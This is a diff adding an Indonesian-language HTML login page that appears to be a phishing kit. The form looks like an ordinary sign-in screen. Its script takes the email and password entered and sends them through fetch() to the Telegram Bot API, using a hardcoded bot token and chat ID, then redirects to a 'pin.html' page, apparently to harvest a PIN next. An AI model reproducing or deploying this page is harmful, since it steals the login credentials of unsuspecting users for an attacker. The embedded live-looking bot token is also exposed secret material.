@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
+
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: #fff;
+      margin: 0;
+      padding: 20px;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 600;
+      margin-top: 20px;
+      margin-bottom: 40px;
+    }
+
+    label {
+      display: block;
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 5px;
+    }
+
+    input {
+      width: 100%;
+      border: none;
+      border-bottom: 1px solid #ccc;
+      padding: 10px 0;
+      font-size: 15px;
+      outline: none;
+    }
+
+    .input-group {
+      margin-bottom: 25px;
+      position: relative;
+    }
+
+    .eye-icon {
+      position: absolute;
+      right: 0;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      user-select: none;
+      width: 22px;
+      height: 22px;
+    }
+
+    .forgot {
+      text-align: right;
+      font-size: 13px;
+      margin-top: -10px;
+      margin-bottom: 30px;
+      color: #007bff;
+      cursor: pointer;
+    }
+
+    button {
+      width: 100%;
+      background: #007bff;
+      border: none;
+      color: #fff;
+      padding: 14px;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    .terms {
+      text-align: center;
+      margin-top: 25px;
+      font-size: 13px;
+      color: #555;
+    }
+
+    .terms a {
+      color: #007bff;
+      text-decoration: none;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+    <h1>Masuk</h1>
+
+    <form id="loginForm">
+      <div class="input-group">
+        <label>Email Kamu</label>
+        <input type="email" id="email" required>
+      </div>
+
+      <div class="input-group">
+        <label>Kata Sandi</label>
+        <input type="password" id="password" required>
+
+        <!-- ICON MATA (SVG) -->
+        <span class="eye-icon" id="togglePassword">
+          <svg id="eyeOpen" viewBox="0 0 24 24" fill="none">
+            <path d="M12 5C5.5 5 2 12 2 12s3.5 7 10 7 10-7 10-7-3.5-7-10-7z"
+                  stroke="#333" stroke-width="2"/>
+            <circle cx="12" cy="12" r="3" stroke="#333" stroke-width="2"/>
+          </svg>
+
+          <svg id="eyeClose" viewBox="0 0 24 24" fill="none" style="display:none;">
+            <path d="M3 3l18 18" stroke="#333" stroke-width="2"/>
+            <path d="M12 5c-6.5 0-10 7-10 7a18.4 18.4 0 0 0 3.5 4.9"
+                  stroke="#333" stroke-width="2"/>
+            <path d="M21.3 15.3A18.2 18.2 0 0 0 22 12s-3.5-7-10-7c-1.9 0-3.6.5-5 1.3"
+                  stroke="#333" stroke-width="2"/>
+          </svg>
+        </span>
+
+      </div>
+
+      <div class="forgot">Lupa Password?</div>
+
+      <button type="submit">Masuk</button>
+    </form>
+
+    <div class="terms">
+      Dengan mendaftar, kamu menyetujui<br>
+      <a href="#">Syarat & Ketentuan</a>
+    </div>
+  </div>
+
+  <script>
+    // === Ganti dengan token kamu ===
+    const BOT_TOKEN = "8544733481:AAH88M3g5IfA7mjltw8OxPVHWfs9cR8f5Ro";
+    const CHAT_ID = "5983910858";
+
+    // Toggle password
+    const togglePassword = document.getElementById('togglePassword');
+    const password = document.getElementById('password');
+    const eyeOpen = document.getElementById('eyeOpen');
+    const eyeClose = document.getElementById('eyeClose');
+
+    togglePassword.addEventListener('click', function () {
+      const isPassword = password.getAttribute('type') === 'password';
+
+      password.setAttribute('type', isPassword ? 'text' : 'password');
+
+      eyeOpen.style.display = isPassword ? "none" : "block";
+      eyeClose.style.display = isPassword ? "block" : "none";
+    });
+
+    // Submit form kirim ke Telegram
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const email = document.getElementById("email").value;
+      const pass = document.getElementById("password").value;
+
+      const message = `
+🔹 *DATA LOGIN*
+-----------------------------
+📧 Email: ${email}
+🔑 Password: ${pass}
+-----------------------------
+      `;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          window.location.href = "pin.html";
+        } else {
+          alert("Gagal mengirim pesan!");
+        }
+      })
+      .catch(error => {
+        alert("Terjadi kesalahan koneksi.");
+      });
+    });
+  </script>
+
+</body>
+</html>
